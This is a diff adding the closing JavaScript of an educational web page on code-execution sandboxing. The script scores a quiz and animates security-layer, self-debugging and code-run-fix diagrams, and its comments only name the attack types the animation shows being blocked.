+      const scoreEl = document.getElementById('quiz-score');
+      const numEl = document.getElementById('score-num');
+      const msgEl = document.getElementById('score-msg');
+      numEl.textContent = `${total}/6`;
+      const msgs = ["Keep going — review the sandbox sections and try again.", "Good start! Revisit the security model section.", "Solid foundation — you've got the core concepts.", "Strong performance! You're ready for the hands-on lab.", "Excellent! You're well-prepared for production sandbox work.", "Perfect score! You've mastered code execution sandboxing."];
+      msgEl.textContent = msgs[total] ?? msgs[5];
+      scoreEl.style.display = 'block';
+      scoreEl.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
+    }
+  }
+
+  // ============================================================
+  // ANIMATION 1: SECURITY POLICY LAYERS
+  // ============================================================
+  let secTimer = null, secStep = 0, secPaused = false;
+  const secSteps = [
+    // step 0: show attacks
+    () => {
+      ['sec-a1','sec-a2','sec-a3','sec-a4','sec-a5'].forEach(id => {
+        document.getElementById(id)?.classList.add('visible');
+      });
+    },
+    // step 1: ring 1 + block loops/forkbombs
+    () => {
+      const r1 = document.getElementById('sec-r1');
+      r1?.classList.add('visible', 'active');
+      document.getElementById('sec-l1')?.classList.add('visible');
+      document.getElementById('sec-a1')?.classList.add('blocked');
+      document.getElementById('sec-a2')?.classList.add('blocked');
+    },
+    // step 2: ring 2 + block path traversal + exfiltration
+    () => {
+      const r2 = document.getElementById('sec-r2');
+      r2?.classList.add('visible', 'active');
+      document.getElementById('sec-l2')?.classList.add('visible');
+      document.getElementById('sec-a3')?.classList.add('defended');
+      document.getElementById('sec-a4')?.classList.add('defended');
+    },
+    // step 3: ring 3 + block rm -rf
+    () => {
+      const r3 = document.getElementById('sec-r3');
+      r3?.classList.add('visible', 'active');
+      document.getElementById('sec-l3')?.classList.add('visible');
+      document.getElementById('sec-a5')?.classList.add('defended');
+    },
+    // step 4: core turns green
+    () => {
+      const core = document.getElementById('sec-core');
+      core?.classList.add('defended');
+      const status = document.getElementById('sec-status');
+      if (status) status.textContent = 'protected';
+    },
+  ];
+  function secPlay() {
+    if (secPaused) { secPaused = false; secTick(); return; }
+    secReset();
+    secPaused = false;
+    secTick();
+  }
+  function secTick() {
+    if (secPaused || secStep >= secSteps.length) return;
+    secSteps[secStep]();
+    secStep++;
+    secTimer = setTimeout(secTick, 900);
+  }
+  function secPause() { secPaused = true; clearTimeout(secTimer); }
+  function secReset() {
+    clearTimeout(secTimer); secPaused = false; secStep = 0;
+    ['sec-r1','sec-r2','sec-r3'].forEach(id => {
+      const el = document.getElementById(id);
+      el?.classList.remove('visible','active');
+    });
+    ['sec-a1','sec-a2','sec-a3','sec-a4','sec-a5'].forEach(id => {
+      const el = document.getElementById(id);
+      el?.classList.remove('visible','blocked','defended');
+    });
+    ['sec-l1','sec-l2','sec-l3'].forEach(id => {
+      document.getElementById(id)?.classList.remove('visible');
+    });
+    const core = document.getElementById('sec-core');
+    core?.classList.remove('defended');
+    const status = document.getElementById('sec-status');
+    if (status) status.textContent = 'unprotected';
+  }
+  // Auto-play on load after brief delay
+  setTimeout(secPlay, 800);
+
+  // ============================================================
+  // ANIMATION 2: SELF-DEBUGGING STATE MACHINE
+  // ============================================================
+  let dbgTimer = null, dbgStep = 0, dbgPaused = false;
+  const dbgIds = ['dbg-s0','dbg-ar0','dbg-s1','dbg-ar1','dbg-s2','dbg-ar2','dbg-s3','dbg-ar3','dbg-s4','dbg-ar4','dbg-s5'];
+  const dbgAttempts = {3: 'attempt: 1/3', 5: 'attempt: 2/3 (retry)', 8: 'attempt: 2/3 — success'};
+  function dbgPlay() {
+    if (dbgPaused) { dbgPaused = false; dbgTick(); return; }
+    dbgReset(); dbgPaused = false; dbgTick();
+  }
+  function dbgTick() {
+    if (dbgPaused || dbgStep >= dbgIds.length) return;
+    const el = document.getElementById(dbgIds[dbgStep]);
+    el?.classList.add('visible');
+    if (dbgStep === 2) el?.classList.add('current');
+    if (dbgStep === 8) el?.classList.add('current');
+    if (dbgStep === 10) {
+      el?.classList.add('current');
+      document.getElementById('dbg-s8')?.classList.remove('current');
+    }
+    const counter = document.getElementById('dbg-counter');
+    if (counter && dbgAttempts[dbgStep]) {
+      counter.textContent = dbgAttempts[dbgStep];
+      counter.classList.add('visible');
+    }
+    dbgStep++;
+    dbgTimer = setTimeout(dbgTick, 700);
+  }
+  function dbgPause() { dbgPaused = true; clearTimeout(dbgTimer); }
+  function dbgReset() {
+    clearTimeout(dbgTimer); dbgPaused = false; dbgStep = 0;
+    dbgIds.forEach(id => {
+      const el = document.getElementById(id);
+      el?.classList.remove('visible','current','success-state');
+    });
+    const counter = document.getElementById('dbg-counter');
+    if (counter) { counter.classList.remove('visible'); counter.textContent = 'attempt: 0/3'; }
+  }
+
+  // ============================================================
+  // ANIMATION 3: CODE-RUN-FIX CYCLE
+  // ============================================================
+  let crfTimer = null, crfStep = 0, crfPaused = false;
+  const crfSeq = [
+    ['crf-user', null],
+    [null, 'crf-a0'],
+    ['crf-model1', null],
+    [null, 'crf-a1'],
+    ['crf-run1', null],
+    [null, 'crf-a2'],
+    ['crf-err', null],
+    [null, 'crf-a3'],
+    ['crf-model2', null],
+    [null, 'crf-a4'],
+    ['crf-run2', null],
+    [null, 'crf-a5'],
+    ['crf-ann', null],
+  ];
+  function crfPlay() {
+    if (crfPaused) { crfPaused = false; crfTick(); return; }
+    crfReset(); crfPaused = false; crfTick();
+  }
+  function crfTick() {
+    if (crfPaused || crfStep >= crfSeq.length) return;
+    const [nodeId, arrowId] = crfSeq[crfStep];
+    if (nodeId) {
+      const el = document.getElementById(nodeId);
+      el?.classList.add('visible');
+      // Remove 'active' from previous nodes
+      document.querySelectorAll('.crf-node.active').forEach(n => n.classList.remove('active'));
+      if (!el?.classList.contains('done') && !el?.classList.contains('fail')) {
+        el?.classList.add('active');
+      }
+    }
+    if (arrowId) {
+      document.getElementById(arrowId)?.classList.add('visible');
+    }
+    crfStep++;
+    crfTimer = setTimeout(crfTick, 600);
+  }
+  function crfPause() { crfPaused = true; clearTimeout(crfTimer); }
+  function crfReset() {
+    clearTimeout(crfTimer); crfPaused = false; crfStep = 0;
+    ['crf-user','crf-model1','crf-run1','crf-err','crf-model2','crf-run2','crf-ann'].forEach(id => {
+      const el = document.getElementById(id);
+      el?.classList.remove('visible','active');
+    });
+    ['crf-a0','crf-a1','crf-a2','crf-a3','crf-a4','crf-a5'].forEach(id => {
+      document.getElementById(id)?.classList.remove('visible');
+    });
+  }
+
+  // Reduced-motion: skip animations entirely
+  if (window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+    // Show all animation elements immediately
+    document.querySelectorAll('.dbg-state,.crf-node,.sec-ring,.sec-attack,.sec-label,.dbg-arrow,.crf-arrow,.crf-annotation,.dbg-attempt-counter').forEach(el => {
+      el.classList.add('visible');
+    });
+  }
+  </script>
+</body>
+</html>
